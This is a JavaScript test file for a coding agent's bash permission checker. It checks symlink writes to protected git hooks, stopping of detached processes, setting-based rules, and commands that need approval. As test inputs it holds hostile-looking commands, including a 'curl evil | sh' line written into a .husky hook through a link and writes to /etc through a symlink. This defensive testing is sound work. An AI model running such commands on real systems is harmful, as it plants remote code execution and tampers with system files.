// TOOL 4, BASH: A THIRD PASS THROUGH CLAUDE CODE'S DOCS (the owner, 2026-11-10: "dont test yet , go look at the claude code
// bash docs again and see what we missing", then "Ok yes do that"). Four things Coder still lacked: writes through a link
// (symlink), a stop that ends a command's runaway processes too, rules on a command's settings, and six cases that ask in
// Accept edits and Plan. Each against Claude Code's docs (read that day) and its own code (2.1.321).
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, writeFile, symlink, rm } from "node:fs/promises";
import { readFileSync, readdirSync } from "node:fs";
import { spawn } from "node:child_process";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

const W = "/work/shop";
const prot = (full) => { const rel = full.startsWith(W + "/") ? full.slice(W.length + 1) : ""; return rel && /^(\.husky|\.git|\.github)(\/|$)|(^|\/)\.npmrc$/.test(rel) ? "protected" : ""; };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const src = (f) => readFileSync(new URL("../container/" + f, import.meta.url), "utf8");

/** A real project folder with links in it: docs/notes.txt → .husky/pre-commit, etc-link → /etc, a loop, a dangling link. */
async function linkedProject() {
  const base = await mkdtemp(join(tmpdir(), "coder-links-"));
  const root = join(base, "proj");
  await mkdir(join(root, ".husky"), { recursive: true });
  await mkdir(join(root, "docs"), { recursive: true });
  await writeFile(join(root, ".husky/pre-commit"), "npm test\n");
  await writeFile(join(root, "a.txt"), "a\n");
  await symlink("../.husky/pre-commit", join(root, "docs/notes.txt"));
  await symlink("../.husky", join(root, "docs/hooks"));
  await symlink("/etc", join(root, "etc-link"));
  await symlink("loop2", join(root, "loop1"));
  await symlink("loop1", join(root, "loop2"));
  await symlink("nowhere-yet.txt", join(root, "dangling.txt"));
  await symlink("proj", join(base, "proj-link"));
  return { base, root, done: () => rm(base, { recursive: true, force: true }) };
}

test("CD342 where a path really leads: every link on the way followed, the last one too (Claude Code's permissions docs, Symlinks: \"the permission check covers two paths: the one Claude requested and the file it resolves to\")", async () => {
  const { realPath, leadsTo } = await import("../container/coder-bashcheck.mjs");
  const p = await linkedProject();
  try {
    const R = p.root;
    assert.equal(realPath(R + "/docs/notes.txt"), R + "/.husky/pre-commit");
    assert.equal(realPath(R + "/docs/hooks/pre-commit"), R + "/.husky/pre-commit");
    assert.equal(realPath(R + "/etc-link/hosts"), "/etc/hosts");
    // A link to nothing yet still says where a write would land; what isn't there is kept as written.
    assert.equal(realPath(R + "/dangling.txt"), R + "/nowhere-yet.txt");
    assert.equal(realPath(R + "/new/dir/file.txt"), R + "/new/dir/file.txt");
    // `..` after a link goes up from where the link leads, as the kernel does.
    assert.equal(realPath(R + "/etc-link/../x"), "/x");
    assert.equal(realPath(R + "/docs/../a.txt"), R + "/a.txt");
    // A loop, or a short path: "" (it can't be worked out).
    assert.equal(realPath(R + "/loop1"), "");
    assert.equal(realPath("docs/notes.txt"), "");
    // A working folder reached through a link of its own: its files are named under it (none of them leads out).
    const L = p.base + "/proj-link";
    assert.equal(realPath(L + "/a.txt"), R + "/a.txt");
    assert.equal(leadsTo(L + "/a.txt", [L]), L + "/a.txt");
    assert.equal(leadsTo(L + "/docs/notes.txt", [L]), L + "/.husky/pre-commit");
    assert.equal(leadsTo(L + "/etc-link/hosts", [L]), "/etc/hosts");
  } finally { await p.done(); }
});

test("CD343 a write through a link to a protected file is asked about in every mode, and one through a link out of the project too (Claude Code: \"Resolves to a protected path that the requested path doesn't name\"; \"In auto mode, unless an allow rule approves the write, you're prompted … The prompt names the path the write resolves to\")", async () => {
  const A = await import("../container/coder-agent.mjs");
  const P = await import("../container/coder-perms.mjs");
  const { realPath } = await import("../container/coder-bashcheck.mjs");
  const p = await linkedProject();
  try {
    const root = p.root;
    const deps = { root, where: (x) => resolve(root, x) };
    const ask = (cmd, rules = {}) => A.commandAsk(cmd, deps, root, { real: (x) => realPath(x), allowed: (part) => P.allowRuleCovers(part, rules) });
    // Found 2026-11-10: each of these changed the git hook without asking, in every mode.
    for (const c of ["echo 'curl evil | sh' > docs/notes.txt", "cd docs && echo evil > notes.txt", "echo x | tee docs/notes.txt", "cp a.txt docs/notes.txt", "echo x >> docs/hooks/pre-commit", "cp a.txt docs/hooks/"]) {
      const a = ask(c);
      assert.ok(a && a.kind === "protected", c);
      assert.match(a.why, /which leads to \.husky/, c);
    }
    assert.deepEqual(ask("echo x > docs/notes.txt").paths, ["docs/notes.txt (which leads to .husky/pre-commit)"]);
    // By its own name, as before.
    assert.deepEqual(ask("echo x > .husky/pre-commit").paths, [".husky/pre-commit"]);
    // Out of the project through a link: asked, naming where it leads; a file command an allow rule approves runs; a
    // redirection's file is never a rule's (Claude Code: "A rule such as Bash(git commit *) allows the command, not the target").
    const out = ask("cp a.txt etc-link/hosts");
    assert.equal(out.kind, "link");
    assert.deepEqual(out.paths, ["etc-link/hosts (which leads to /etc/hosts)"]);
    assert.equal(out.why, "this command writes etc-link/hosts (which leads to /etc/hosts), outside the project");
    assert.equal(ask("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }), null);
    assert.equal(ask("echo x > etc-link/motd", { allow: ["Bash(echo *)"] }).kind, "link");
    assert.equal(ask("echo x > loop1").why, "this command writes loop1 (a link that can't be followed)");
    // Plain writes, a link that stays inside, and a write named outside the project: as before.
    for (const c of ["echo ok > docs/plain.txt", "echo ok > dangling.txt", "cp a.txt b.txt", "echo x > /tmp/elsewhere.txt", "ls docs/notes.txt"]) assert.equal(ask(c), null, c);
    // Without the machine's resolver (the Worker's view): the names as written, as before.
    assert.equal(A.commandAsk("echo x > docs/notes.txt", deps, root), null);
    // Accept edits: not approved by the mode, the card naming the link.
    const isProtected = (full) => { const rel = full === root ? "." : full.slice(root.length + 1); return A.protectedFile(rel) || A.protectedFile(rel + "/x"); };
    const d = (cmd, rules = {}) => P.bashDecision(cmd, { mode: "acceptEdits", rules, cwd: root, workdirs: [root], isProtected, real: (x) => realPath(x) });
    assert.deepEqual([d("echo x > docs/notes.txt").verdict, d("echo x > docs/notes.txt").why], ["ask", "This command writes docs/notes.txt, which leads to .husky/pre-commit, a protected file."]);
    assert.deepEqual([d("cp a.txt etc-link/hosts").verdict, d("cp a.txt etc-link/hosts").why], ["ask", "This command changes etc-link/hosts, which leads to /etc/hosts, outside the project."]);
    assert.equal(d("cp a.txt etc-link/hosts", { allow: ["Bash(cp *)"] }).verdict, "allow");
    assert.equal(d("echo x > etc-link/motd").why, "This command writes etc-link/motd, which leads to /etc/motd, outside the project.");
    assert.equal(d("cat < etc-link/hostname").why, "This command reads etc-link/hostname, which leads to /etc/hostname, from outside the project.");
    for (const c of ["echo ok > docs/plain.txt", "cp a.txt b.txt", "rm a.txt", "cat < a.txt"]) assert.equal(d(c).verdict, "allow", c);
  } finally { await p.done(); }
});

test("CD344 the machine wires it in: both checks get the link resolver, the permission check the call's settings; the page's card for a write through a link", () => {
  const agent = src("coder-agent.mjs");
  assert.match(agent, /commandAsk\(command, deps, where0, \{ real: \(p\) => realPath\(p\), allowed: \(part\) => !github && allowRuleCovers\(part, ownRules\) \}\)/);
  assert.match(agent, /bashDecision\(command, \{ mode: modeB, rules: ownRules, cwd: where0 \|\| deps\.root \|\| "\/", workdirs, isProtected: isProt, real: \(p\) => realPath\(p\), input: c\.args \}\)/);
  const page = readFileSync(new URL("../public/coder.js", import.meta.url), "utf8");
  assert.match(page, /link = e\.kind === 'link' && paths\.length/);
  assert.match(page, /This command writes through a link that leads out of the project/);
});

test("CD345 a stop ends what the command started outside its process group too (Claude Code's docs: \"processes that detached from the task's shell, such as ones started under setsid or timeout, stop too\")", async () => {
  process.env.CODER_TEST = "1";
  const S = await import("../container/server.mjs");
  const F = await import("../container/coder-freeze.mjs");
  const mine = () => { const m = new Map(); for (const n of readdirSync("/proc")) if (/^\d+$/.test(n)) { try { const st = F.statOf(readFileSync("/proc/" + n + "/stat", "utf8")); if (st) m.set(Number(n), st); } catch { /* gone */ } } return m; };
  const marked = (mark) => [...mine().keys()].filter((pid) => F.markOf(pid) === mark);
  const mark = S.newMark(), other = S.newMark();
  assert.match(mark, /^[0-9a-f]{16}$/);
  const job = spawn("bash", ["-c", "setsid sleep 301 & timeout 300 sleep 302 & sleep 303 & wait"], { detached: true, stdio: "ignore", env: { ...process.env, [F.TASK_MARK]: mark } });
  const bystander = spawn("bash", ["-c", "setsid sleep 304 & wait"], { detached: true, stdio: "ignore", env: { ...process.env, [F.TASK_MARK]: other } });
  try {
    await wait(700);
    assert.equal(marked(mark).length, 5);
    // The old stop, its process group only: what left it (setsid, timeout and its child) goes on.
    process.kill(-job.pid, "SIGKILL");
    await wait(300);
    assert.equal(marked(mark).length, 3);
    // The new one: every process carrying the mark, and nothing else.
    assert.equal(S.endMarked(mark, "SIGKILL", { look: mine }), 3);
    await wait(300);
    assert.equal(marked(mark).length, 0);
    assert.equal(marked(other).length, 2);
    // No mark, or not one of Coder's: nothing is signalled.
    assert.equal(S.endMarked("", "SIGKILL", { look: mine }), 0);
    assert.equal(S.endMarked("not-a-mark", "SIGKILL", { look: mine }), 0);
  } finally {
    try { process.kill(-job.pid, "SIGKILL"); } catch { /* gone */ }
    try { process.kill(-bystander.pid, "SIGKILL"); } catch { /* gone */ }
    S.endMarked(mark, "SIGKILL", { look: mine }); S.endMarked(other, "SIGKILL", { look: mine });
  }
  // Every stop uses it: the owner's Stop, a time limit, 5 GB, low memory (stopJob), and Coder's own stop_job.
  const server = src("server.mjs");
  assert.match(server, /try \{ process\.kill\(-j\.pid, hard \? "SIGKILL" : "SIGTERM"\); \} catch \{ \/\* gone \*\/ \}\n  endMarked\(j\.mark, hard \? "SIGKILL" : "SIGTERM"\);/);
  assert.match(server, /try \{ process\.kill\(-j\.pid, "SIGKILL"\); \} catch \{ \/\* gone \*\/ \}\n    endMarked\(j\.mark, "SIGKILL"\);/);
  assert.match(server, /process\.kill\(-pid, "SIGTERM"\); \} catch \{ \/\* gone \*\/ \}\n            endMarked\(j\.mark, "SIGTERM"\);/);
  // Each of the chat's commands carries one (after the owner's own variables), and its background job keeps it.
  assert.match(server, /const mark = tool \? "" : newMark\(\);/);
  assert.match(server, /: \{ \.\.\.\(extraEnv \|\| \{\}\), \[TASK_MARK\]: mark \},/);
  assert.match(server, /cwd: startedIn, at: startedAt, mark, moved: !inBg,/);
});

test("CD346 the sweep keeps a running command's processes that left its process group (found 2026-11-10: `timeout 600 npm run dev` in the background, or a browser a test opened, was ended at the end of the job)", async () => {
  const F = await import("../container/coder-freeze.mjs");
  // A process's mark, from the environment it started with.
  const env = (pairs) => Buffer.from(pairs.map((x) => x + "\0").join(""));
  const reads = { "/proc/11/environ": env(["PATH=/bin", F.TASK_MARK + "=aaaaaaaaaaaaaaaa", "X=1"]), "/proc/12/environ": env([F.TASK_MARK + "=bbbbbbbbbbbbbbbb"]), "/proc/13/environ": env(["PATH=/bin"]), "/proc/14/environ": env(["NOT_" + F.TASK_MARK + "=aaaaaaaaaaaaaaaa"]) };
  const read = (f) => { if (!(f in reads)) throw new Error("gone"); return reads[f]; };
  assert.equal(F.markOf(11, { read }), "aaaaaaaaaaaaaaaa");
  assert.equal(F.markOf(12, { read }), "bbbbbbbbbbbbbbbb");
  assert.equal(F.markOf(13, { read }), "");
  assert.equal(F.markOf(14, { read }), "");
  assert.equal(F.markOf(99, { read }), "");
  // While paused: the kept command's group, and its marked processes in groups of their own, stay; the rest are ended.
  const procs = new Map([[10, { pgrp: 10 }], [11, { pgrp: 11 }], [12, { pgrp: 12 }], [13, { pgrp: 13 }], [14, { pgrp: 14 }]]);
  const ended = [];
  const n = await F.endOthers(procs, new Set([10]), { keepMarks: new Set(["aaaaaaaaaaaaaaaa"]), waitMs: 0, deps: { kill: (pid) => { ended.push(pid); return true; }, gone: () => true, markOf: (pid) => F.markOf(pid, { read }) } });
  assert.equal(n, 3);
  assert.deepEqual(ended.sort(), [12, 13, 14]);
  assert.deepEqual([...procs.keys()].sort(), [10, 11]);
  // The machine gives the sweep its kept commands' marks.
  assert.match(src("server.mjs"), /keepMarks: new Set\(live\.map\(\(j\) => j\.mark\)\.filter\(Boolean\)\)/);
});

test("CD347 rules on one of the command's settings, such as Bash(run_in_background:true) (Claude Code's permissions docs, \"Match by input parameter\")", async () => {
  const P = await import("../container/coder-perms.mjs");
  const d = (cmd, input, rules, mode = "auto") => P.bashDecision(cmd, { mode, rules, cwd: W, workdirs: [W], isProtected: prot, input });
  // Deny: a background call is refused, in every mode; the same command in the foreground runs.
  for (const mode of ["auto", "acceptEdits", "plan"]) assert.equal(d("npm run dev", { command: "npm run dev", run_in_background: true }, { deny: ["Bash(run_in_background:true)"] }, mode).verdict, "deny", mode);
  assert.equal(d("npm run dev", { command: "npm run dev" }, { deny: ["Bash(run_in_background:true)"] }).verdict, "allow");
  assert.equal(d("npm run dev", { command: "npm run dev", run_in_background: false }, { deny: ["Bash(run_in_background:true)"] }).verdict, "allow");
  // Ask: any value with *, never one the call leaves out ("A parameter the model omits is never matched").
  const t = d("make", { command: "make", timeout: 600000 }, { ask: ["Bash(timeout:*)"] });
  assert.deepEqual([t.verdict, t.why, t.byRule], ["ask", "Your rule Bash(timeout:*) asks first for this command.", true]);
  assert.equal(d("make", { command: "make" }, { ask: ["Bash(timeout:*)"] }).verdict, "allow");
  assert.equal(d("make", { command: "make", timeout: 600000 }, { ask: ["Bash(timeout:6*)"] }).verdict, "ask");
  assert.equal(d("make", { command: "make", timeout: 120000 }, { ask: ["Bash(timeout:6*)"] }).verdict, "allow");
  // Exact without *; whitespace around the colon is ignored; the literal value Grok sent.
  assert.equal(d("ls", { command: "ls", description: "Deploy the site" }, { ask: ["Bash( description : Deploy the site )"] }).verdict, "ask");
  assert.equal(d("ls", { command: "ls", description: "Deploy the site now" }, { ask: ["Bash(description:Deploy the site)"] }).verdict, "allow");
  assert.equal(d("ls", { command: "ls", run_in_background: "true" }, { ask: ["Bash(run_in_background:true)"] }).verdict, "ask");
  // Deny comes first, whichever kind: a setting's ask never hides a command's deny.
  assert.equal(d("git push", { command: "git push", run_in_background: true }, { ask: ["Bash(run_in_background:true)"], deny: ["Bash(git push *)"] }).verdict, "deny");
  // A rule on a setting is no command pattern for deny and ask: `Bash(timeout:*)` doesn't stop the timeout command.
  assert.equal(d("timeout 5 ls", { command: "timeout 5 ls" }, { deny: ["Bash(timeout:*)"] }).verdict, "allow");
  // Allow rules keep the command's syntax ("allow rules continue to use each tool's own specifier syntax"): one written
  // like a rule on a setting approves no call by its setting.
  assert.equal(d("npm run dev", { command: "npm run dev", run_in_background: true }, { allow: ["Bash(run_in_background:true)"] }, "acceptEdits").verdict, "ask");
  assert.equal(d("ls:x", { command: "ls:x" }, { allow: ["Bash(ls:*)"] }, "acceptEdits").verdict, "ask");
  // A rule on the command itself is never one (Claude Code ignores it and warns): refused when added, with why.
  assert.equal(P.parseRule("Bash(command:rm *)"), null);
  assert.equal(P.ruleProblem("Bash(command:rm *)"), "Bash(command:…) can't be used: a rule on the command itself could be got round by a command joined to another one. Write the command as the rule instead, such as Bash(rm *).");
  assert.equal(P.ruleProblem("Bash(rm *)"), "");
  assert.deepEqual(P.parseRule("Bash(run_in_background:true)"), { tool: "Bash", spec: "run_in_background:true" });
  assert.equal(d("rm -rf build", { command: "rm -rf build" }, { deny: ["Bash(command:rm *)"] }).verdict, "allow");
  const routes = readFileSync(new URL("../src/coder-routes.mjs", import.meta.url), "utf8");
  assert.match(routes, /if \(ruleProblem\(rule\)\) return json\(\{ error: ruleProblem\(rule\) \}, 400\);/);
});

test("CD348 six cases that ask in Accept edits and Plan, as in Claude Code, and still run in Auto", async () => {
  const P = await import("../container/coder-perms.mjs");
  const d = (cmd, mode = "acceptEdits", rules = {}) => P.bashDecision(cmd, { mode, rules, cwd: W, workdirs: [W], isProtected: prot });
  const asks = (cmd, rules = {}) => { for (const m of ["acceptEdits", "plan"]) assert.equal(d(cmd, m, rules).verdict, "ask", m + ": " + cmd); assert.equal(d(cmd, "auto", rules).verdict, "allow", "auto: " + cmd); };
  // 1. A loop over one of the shell's own variables (Claude Code: "loops over certain special shell variables, such as PATH or IFS").
  for (const c of ["for PATH in /tmp; do ls; done", "select IFS in a b; do echo; done", "for LD_PRELOAD in x; do ls; done", "for HOME in /tmp; do ls; done", "echo $(for PS4 in a; do echo; done)", "bash -c 'for path in a; do ls; done'"]) asks(c);
  assert.equal(d("for PATH in /tmp; do ls; done").why, "This command loops over PATH, a variable the shell itself uses, so it can't be checked before it runs and needs your approval.");
  for (const c of ["for f in a.js b.js; do ls; done", "for x in 1 2; do echo hi; done"]) assert.equal(d(c).verdict, "allow", c);
  // (A `$f` in its body asks, as before: an argument with $ is never read-only; not for its loop variable.)
  assert.equal(d("for f in a.js; do wc -l $f; done").why, "This command requires approval");
  // 2. An operator with nothing after it: no allow rule approves it ("treats the command as unparseable").
  for (const c of ["npm test &&", "npm test ||", "npm test | ", "npm test && # then lint"]) asks(c, { allow: ["Bash(npm *)"] });
  assert.equal(d("npm test &&", "acceptEdits", { allow: ["Bash(npm *)"] }).why, "This command ends with an operator (&&, || or |) that has nothing after it, so it can't be checked before it runs and needs your approval.");
  for (const c of ["npm test && npm run lint", "npm test &&\nnpm run lint", "npm test && (npm run lint)", "npm test && [[ -f x ]]"]) assert.equal(d(c, "acceptEdits", { allow: ["Bash(npm *)"] }).verdict, "allow", c);
  // 3. Exec wrappers: a prefix rule doesn't approve them, an exact rule does.
  for (const [c, r] of [["watch -n1 ls", "Bash(watch *)"], ["setsid npm start", "Bash(setsid *)"], ["flock /tmp/l make", "Bash(flock *)"], ["ionice -c3 make", "Bash(ionice:*)"], ["nsenter -t 1 ls", "Bash(nsenter *)"]]) asks(c, { allow: [r] });
  assert.equal(d("watch -n1 ls", "acceptEdits", { allow: ["Bash(watch -n1 ls)"] }).verdict, "allow");
  assert.equal(d("watch -n1 ls", "acceptEdits", { allow: ["Bash"] }).verdict, "allow");
  // 4. find that runs, deletes or writes: the same; an exact rule with a * in it is a pattern, so it still asks.
  for (const c of ["find . -delete", "find . -name x -exec rm {} ;", "find . -fprint out.txt"]) asks(c, { allow: ["Bash(find *)"] });
  assert.equal(d("find build -type f -delete", "acceptEdits", { allow: ["Bash(find build -type f -delete)"] }).verdict, "allow");
  assert.equal(d("find . -name '*.tmp' -delete", "acceptEdits", { allow: ["Bash(find . -name '*.tmp' -delete)"] }).verdict, "ask");
  assert.equal(d("find . -name x", "acceptEdits", { allow: ["Bash(find *)"] }).verdict, "allow");
  // 5. Docker pointed at another machine, wherever the flag is.
  for (const c of ["docker ps --context prod", "docker images --host tcp://x:2375", "docker ps -H tcp://x", "docker ps -Htcp://x", "docker images --config /tmp/c"]) asks(c);
  for (const c of ["docker ps", "docker ps -a", "docker images"]) assert.equal(d(c, "plan").verdict, "allow", c);
  // 6. A redirection to a wildcard name, and a `<` read with a wildcard or after a cd ("even when an allow rule covers it").
  asks("ls > *.txt");
  asks("cat < *.txt");
  asks("cd src && cat < notes.txt", { allow: ["Bash(cat *)"] });
  assert.equal(d("ls > *.txt").why, "This command writes *.txt, a name with a wildcard, which can't be checked before it runs.");
  assert.equal(d("cd src && cat < notes.txt").why, "This command reads notes.txt after a cd, which can't be checked before it runs.");
  for (const c of ["ls > \"*.txt\"", "cat < notes.txt", "cat < /work/shop/src/a.js", "cd src && cat < /work/shop/notes.txt"]) assert.equal(d(c).verdict, "allow", c);
  // (A here-string is text, not a file: Claude Code checks no "here-docs and here-strings".)
  assert.equal(d("cat <<< /etc/passwd", "plan").verdict, "allow");
});

test("CD349 the shell reader: each loop's own variable, and an operator with nothing after it (bash: \"syntax error\")", async () => {
  const { parseShell } = await import("../container/coder-shell.mjs");
  const r = (c) => { const x = parseShell(c); return { dangling: x.dangling, loops: x.loopVars }; };
  for (const c of ["npm test &&", "npm test ||", "ls |", "ls |&", "a && && b", "a &&\n", "npm test && # note", "(a &&)"]) assert.equal(r(c).dangling, true, c);
  for (const c of ["a && b", "a &&\n b", "a && (b)", "a && [[ -f y ]]", "a && (( 1 + 1 ))", "a & b", "a; b;", "f() { a; } && f", "case x in a|b) echo;; esac && echo ok", "echo 'a &&'", "echo a \\&&& echo b"]) assert.equal(r(c).dangling, false, c);
  assert.deepEqual(r("for PATH in a b; do ls; done").loops, ["PATH"]);
  assert.deepEqual(r("select IFS in a; do ls; done").loops, ["IFS"]);
  assert.deepEqual(r("x=$(for HOME in a; do echo; done)").loops, ["HOME"]);
  assert.deepEqual(r("bash -c 'for PS4 in a; do :; done'").loops, ["PS4"]);
  assert.deepEqual(r("for ((i=0; i<3; i++)); do echo; done").loops, []);
  assert.deepEqual(r("echo for PATH in a").loops, []);
  const P = await import("../container/coder-perms.mjs");
  for (const n of ["PATH", "IFS", "PS4", "HOME", "LD_PRELOAD", "ld_library_path", "DYLD_INSERT_LIBRARIES", "BASH_FUNC_x%%", "BASH_ENV", "CDPATH", "path", "OPTIND", "RANDOM", "PROMPT"]) assert.equal(P.shellVariable(n), true, n);
  for (const n of ["f", "x", "file", "i", "PATHS", "MY_PATH"]) assert.equal(P.shellVariable(n), false, n);
});
